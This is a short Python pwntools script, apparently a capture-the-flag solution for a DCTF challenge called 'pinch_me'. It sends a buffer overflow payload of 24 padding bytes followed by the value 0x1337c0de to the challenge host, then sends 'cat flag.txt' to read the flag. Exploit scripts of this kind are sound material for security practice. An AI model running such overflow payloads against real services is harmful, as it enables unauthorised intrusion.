#!/usr/bin/env python3
import pwn

host = "dctf1-chall-pinch-me.westeurope.azurecontainer.io"
port = 7480
target = "pinch_me"


def exploit(remote):
    if remote:
        pr = pwn.connect(host, port)
    else:
        pr = pwn.process(target)

    try:
        payload = b"A"*24
        payload += pwn.p64(0x1337c0de)

        print(payload, len(payload))
        pr.sendafter("dreaming?\n", payload)
        pr.sendline()
        pr.sendline('cat flag.txt')
        print(pr.readall(2))
    except Exception:
        pass
    finally:
        pr.close()

exploit(True)
